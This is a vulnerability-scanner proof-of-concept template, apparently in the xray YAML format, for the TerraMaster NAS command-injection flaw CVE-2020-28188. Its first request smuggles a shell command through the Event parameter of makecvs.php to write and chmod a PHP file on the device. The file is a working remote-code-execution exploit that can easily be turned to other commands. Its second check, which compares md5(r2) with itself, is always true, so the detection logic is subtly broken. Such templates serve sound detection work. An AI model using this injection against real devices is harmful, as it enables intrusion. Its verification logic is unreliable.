name: poc-yaml-terramaster-cve-2020-28188-rce
set:
  r2: randomLowercase(10)
rules:
  - method: GET
    path: /include/makecvs.php?Event=http|echo%20"<?php%20echo%20md5({{r2}});unlink(__FILE__);?>"%20>>%20/usr/www/{{r2}}.php%20&&%20chmod%20755%20/usr/www/{{r2}}.php||
    follow_redirects: false
    expression: |
      response.body.bcontains(bytes("Service,DateTime")) && response.status == 200 && "text/csv" in response.headers
  - method: GET
    path: /{{r2}}.php
    follow_redirects: false
    expression: |
      response.status == 200 && md5(r2).contains(md5(r2))
detail:
  author: 1au
  links:
    - http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202012-1548
